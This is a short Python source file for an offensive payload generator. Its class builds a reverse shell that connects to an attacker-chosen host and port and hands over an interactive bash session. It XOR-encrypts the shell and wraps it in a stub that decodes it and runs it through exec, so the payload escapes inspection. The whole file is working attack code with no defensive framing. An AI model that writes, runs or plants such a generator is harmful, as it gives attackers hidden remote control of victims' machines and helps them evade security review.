# -*- coding: utf-8 -*-
import base64
import os
from rich.console import Console

console = Console()

class ShtiwePayload:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def _xor_cipher(self, data, key="YOUSEF"):
        return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])

    def generate_python_revshell(self, output_file="shell.py"):
        console.print(f"[bold red][][/bold red] Generating XOR-obfuscated Python Reverse Shell...")
        
        raw_code = f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{self.lhost}",{self.lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
        """.strip()

        encrypted = self._xor_cipher(raw_code.encode())
        payload = f"""
import base64
e = {encrypted}
def x(d, k="YOUSEF"): return bytes([b ^ ord(k[i % len(k)]) for i, b in enumerate(d)])
exec(x(e).decode())
        """.strip()

        with open(output_file, "w") as f:
            f.write(payload)
        
        console.print(f"[bold green][+][/bold green] Payload saved to: {output_file}")
        return output_file
